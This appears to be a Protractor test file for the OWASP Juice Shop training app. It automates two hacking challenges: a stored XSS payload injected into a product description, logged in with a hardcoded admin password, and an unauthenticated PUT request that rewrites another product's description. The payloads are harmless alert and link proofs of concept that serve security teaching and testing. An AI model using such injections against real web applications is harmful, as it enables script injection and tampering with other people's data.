'use strict';

describe('/rest', function () {

    describe('challenge "xss4"', function () {

        protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});

        it('should be possible to create a new product when logged in', function () {

            browser.ignoreSynchronization = true;
            browser.executeScript('var $http = angular.injector([\'myApp\']).get(\'$http\'); $http.post(\'/api/Products\', {name: \'XSS4\', description: \'<script>alert("XSS4")</script>\', price: 47.11});');
            browser.driver.sleep(1000);

            browser.get('/#/search');
            browser.driver.sleep(2000);

            browser.switchTo().alert().then(
                function (alert) {
                    expect(alert.getText()).toEqual('XSS4');
                    alert.accept();
                    browser.executeScript('var $http = angular.injector([\'myApp\']).get(\'$http\'); $http.put(\'/api/Products/10\', {description: \'alert disabled\'});');
                    browser.driver.sleep(2000);
                    browser.ignoreSynchronization = false;
                });

            browser.switchTo().alert().then(
                function (alert) {
                    expect(alert.getText()).toEqual('XSS4');
                    alert.accept();
                },
                function(err) {
                    console.log('Second alert did not trigger. No big deal.');
                }
            );

        });

        protractor.expect.challengeSolved({challenge: 'xss4'});

    });

    describe('challenge "changeProduct"', function () {

        it('should be possible to change product via PUT request without being logged in', function () {
            browser.executeScript('var $http = angular.injector([\'myApp\']).get(\'$http\'); $http.put(\'/api/Products/9\', {description: \'<a href="http://kimminich.de" target="_blank">kimminich.de</a>\'});');
        });

        protractor.expect.challengeSolved({challenge: 'changeProduct'});

    });

});
